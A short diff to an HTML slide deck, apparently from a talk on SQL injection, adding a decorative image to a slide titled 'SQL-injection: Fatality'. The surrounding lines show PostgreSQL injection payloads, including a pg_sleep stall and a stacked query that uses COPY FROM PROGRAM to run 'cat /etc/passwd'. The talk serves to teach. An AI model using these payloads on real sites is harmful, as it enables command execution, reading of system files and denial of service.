@@ -938,6 +938,7 @@ UNION SELECT NULL, pg_sleep(3600) --</mark>'</code></pre>
 
 <section class="slide">
     <h2>SQL-injection: Fatality</h2>
+    <img class="next" style="position: absolute; bottom: 0px; height: 200px; right: 0px" src="toasty.png"/>
     <ul>
         <li><code>http://xxx/news.php?id=-1'; CREATE TEMP TABLE tmp1 (content text); COPY tmp1 FROM PROGRAM 'cat /etc/passwd'; UPDATE news SET body = (SELECT string_agg(content, E'\n') FROM tmp1) WHERE id = 1; --</code><br/>
             <pre><code class="sql">SELECT title, body FROM news WHERE id='<mark>-1';
